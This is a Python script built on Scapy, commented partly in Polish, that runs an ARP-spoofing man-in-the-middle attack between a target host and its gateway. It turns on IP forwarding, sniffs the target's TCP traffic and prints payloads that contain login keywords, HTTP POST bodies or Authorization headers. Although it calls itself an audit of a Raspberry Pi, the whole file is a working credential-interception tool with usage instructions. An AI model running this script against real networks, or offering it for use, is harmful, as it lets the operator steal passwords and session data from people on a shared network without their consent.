import sys
import os
import time
import threading
import signal
import logging

# Konfiguracja logowania
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

try:
    from scapy.all import *
except ImportError:
    print("[-] Scapy not installed. Please run: pip install scapy")
    sys.exit(1)

# Configuration
conf.verb = 0 # Silent scapy

def enable_ip_forwarding():
    print("[*] Enabling IP Forwarding...")
    if os.name == 'nt':
        print("[!] Windows detected. Please enable IP Routing manually in Registry/Services if needed.")
    else:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def spoof(target_ip, host_ip):
    """
    Spoofs target_ip says that I (attacker) am host_ip.
    """
    target_mac = get_mac(target_ip)
    if not target_mac:
        return False
    
    # ARP Reply: ip=host_ip, mac=MyMAC -> send to target_ip, target_mac
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    sendp(packet, verbose=False)
    return True

def restore(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    
    if not target_mac or not host_mac:
        return

    # Restore connection: target sees real mac of host
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(packet, count=4, verbose=False)

def packet_callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = bytes(packet[Raw].load)
        
        # Słowa kluczowe wskazujące na logowanie
        keywords = [b"user", b"pass", b"login", b"password", b"auth", b"admin"]
        
        try:
            # Filtrujemy tylko pakiety zawierające słowa kluczowe
            for keyword in keywords:
                if keyword in payload.lower():
                    print(f"\n[!] MOŻLIWE DANE UWIERZYTELNIAJĄCE ZNALEZIONE!")
                    print(f"    Source: {packet[IP].src} -> Destination: {packet[IP].dst}")
                    # Wyświetl fragment payloadu dla kontekstu (pierwsze 200 bajtów lub wokół znaleziska)
                    print(f"    Payload: {payload[:200]}") 
                    break
            
            # Dodatkowo logujemy nagłówki HTTP
            if b"HTTP" in payload:
                if b"POST" in payload or b"Authorization" in payload:
                     print(f"\n[>] Interesujący pakiet HTTP:")
                     print(f"    {payload[:300]}")

        except Exception as e:
            pass

def main():
    if len(sys.argv) < 3:
        print(f"Usage: sudo python3 {sys.argv[0]} <Target_RPi_IP> <Gateway_IP>")
        print(f"Example: sudo python3 {sys.argv[0]} 192.168.0.100 192.168.0.1")
        return

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    
    print(f"[*] Rozpoczynanie Audytu MITM dla Raspberry Pi")
    print(f"    Cel (RPi): {target_ip}")
    print(f"    Brama    : {gateway_ip}")
    
    enable_ip_forwarding()
    
    try:
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)
        if not target_mac or not gateway_mac:
            print("[-] Nie można ustalić adresów MAC. Sprawdź połączenie.")
            sys.exit(1)
            
        print(f"[*] MAC Celu : {target_mac}")
        print(f"[*] MAC Bramy: {gateway_mac}")
    except Exception as e:
        print(f"[-] Błąd: {e}")
        sys.exit(1)

    stop_event = threading.Event()

    def spoof_loop():
        try:
            while not stop_event.is_set():
                spoof(target_ip, gateway_ip) 
                spoof(gateway_ip, target_ip)
                time.sleep(2)
        except Exception as e:
             print(f"[-] Błąd w pętli spoofing: {e}")

    # Start Spoofing Thread
    t = threading.Thread(target=spoof_loop, daemon=True)
    t.start()
    print("[*] ARP Spoofing uruchomiony... Naciśnij Ctrl+C aby zatrzymać.")
    print("[*] Nasłuchiwanie pakietów (szukanie haseł)...")

    # Start Sniffing
    # Filtrujemy ruch związany z celem
    sniffer_filter = f"host {target_ip} and tcp"
    
    try:
        sniff(filter=sniffer_filter, prn=packet_callback, store=False)
    except KeyboardInterrupt:
        print("\n[*] Zatrzymywanie ataku...")
        stop_event.set()
        t.join(timeout=1)
        print("[*] Przywracanie tablic ARP...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[*] Zakończono.")

if __name__ == "__main__":
    main()
